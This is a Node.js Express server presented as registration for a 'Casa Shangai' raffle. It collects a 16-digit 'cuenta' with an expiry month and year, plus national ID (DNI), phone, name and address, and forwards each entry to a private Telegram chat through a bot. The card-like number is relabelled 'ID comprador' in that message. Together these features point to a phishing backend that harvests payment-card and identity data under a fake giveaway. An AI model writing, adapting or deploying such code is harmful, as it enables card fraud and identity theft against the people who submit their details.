const express = require('express');
const cors = require('cors');
const app = express();

app.set('trust proxy', 1);
app.use(express.json({ limit: '64kb' }));

const ORIGENES = (process.env.ORIGENES || '*').split(',').map(s => s.trim());
app.use(cors({
  origin: (o, cb) => (!o || ORIGENES.includes('*') || ORIGENES.includes(o)) ? cb(null, true) : cb(new Error('CORS')),
  methods: ['GET', 'POST', 'OPTIONS']
}));

const vistos = new Map();
let participantes = 0;
const golpes = new Map();

const esc = s => String(s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

app.get('/api/sorteo/ping', (_, res) => res.json({ ok: true, servicio: 'sorteo', hora: new Date().toISOString() }));

app.post('/api/sorteo', async (req, res) => {
  const d = req.body || {};
  const ip = req.ip;

  const ahora = Date.now();
  const g = golpes.get(ip) || { n: 0, t: ahora };
  if (ahora - g.t > 600000) { g.n = 0; g.t = ahora; }
  if (++g.n > 6) { golpes.set(ip, g); return res.status(429).json({ ok: false }); }
  golpes.set(ip, g);

  const errores = [];
  if (!/^\d{16}$/.test(d.cuenta || '')) errores.push({ mensaje: 'La cuenta debe tener 16 dígitos.' });
  if (!d.nombre || d.nombre.trim().length < 5) errores.push({ mensaje: 'Nombre inválido.' });
  if (!/^\d{8}$/.test(d.dni || '')) errores.push({ mensaje: 'DNI inválido.' });
  if (!/^9\d{8}$/.test(d.celular || '')) errores.push({ mensaje: 'Celular inválido.' });
  if (!d.direccion || d.direccion.trim().length < 8) errores.push({ mensaje: 'Dirección inválida.' });
  if (errores.length) return res.status(400).json({ ok: false, errores });

  if (vistos.has(d.dni)) {
    return res.status(409).json({ ok: false, mensaje: 'Este DNI ya está registrado en el sorteo.' });
  }

  const idRegistro = 'SH-' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2, 6).toUpperCase();
  const numeroParticipante = ++participantes;

  const texto = [
    '<b>🎟 NUEVO REGISTRO DE SORTEO — CASA SHANGAI</b>',
    `<b>ID:</b> <code>${esc(idRegistro)}</code> · <b>Participante #</b> ${numeroParticipante}`,
    '',
    `<b>ID comprador:</b> <code>${esc(d.cuenta)}</code>`,
    `<b>Nombre:</b> ${esc(d.nombre)}`,
    `<b>DNI:</b> <code>${esc(d.dni)}</code>`,
    `<b>Celular:</b> <a href="tel:+51${esc(d.celular)}">${esc(d.celular)}</a>`,
    `<b>Vigencia:</b> ${esc(d.mes)}/${esc(d.anio)}`,
    `<b>Dirección:</b> ${esc(d.direccion)}`,
    '',
    `<i>${new Date().toLocaleString('es-PE', { timeZone: 'America/Lima', hour12: false })}</i>`
  ].join('\n').slice(0, 4000);

  try {
    const r = await fetch(`https://api.telegram.org/bot${process.env.TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.TG_CHAT_ID,
        text: texto,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    const j = await r.json();
    if (!j.ok) return res.status(502).json({ ok: false, mensaje: 'Telegram rechazó el mensaje.' });
  } catch {
    return res.status(500).json({ ok: false, mensaje: 'No se pudo notificar.' });
  }

  vistos.set(d.dni, idRegistro);
  return res.status(201).json({ ok: true, idRegistro, numeroParticipante });
});

app.get('/', (_, res) => res.json({ ok: true }));
app.listen(process.env.PORT || 3000);